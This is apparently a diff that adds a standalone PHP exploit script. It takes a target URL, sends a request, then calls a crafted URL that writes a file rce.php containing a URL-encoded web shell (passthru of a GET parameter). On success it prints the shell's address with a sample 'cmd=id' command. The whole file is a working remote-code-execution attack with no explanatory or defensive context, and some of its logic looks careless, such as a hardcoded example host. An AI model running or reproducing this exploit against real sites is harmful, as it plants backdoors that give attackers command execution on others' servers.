@@ -1,0 +1,36 @@
+<?php
+ 
+$options = getopt('u:');
+   
+if(!isset($options['u']))
+die("\n        Usage example: php exploit.php -u http://ww.example.com/ \n"); 
+   
+$url     =  $options['u'];
+$shell = "www.example.com/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E";
+
+$headers = array('User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)',
+'Content-Type: text/plain');
+   
+echo "        [+] Submitting request to: {$options['u']}\n";
+   
+$handle = curl_init();
+   
+curl_setopt($handle, CURLOPT_URL, $url);
+curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
+   
+$source = curl_exec($handle);
+curl_close($handle);
+   
+if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r'))
+{
+echo "        [+] Exploit completed successfully!\n";
+echo "        ______________________________________________\n\n        {$url}/data/rce.php?cmd=id\n";
+}
+else
+{
+die("        [+] Exploit was unsuccessful.\n");
+}
+    
+?>  
+
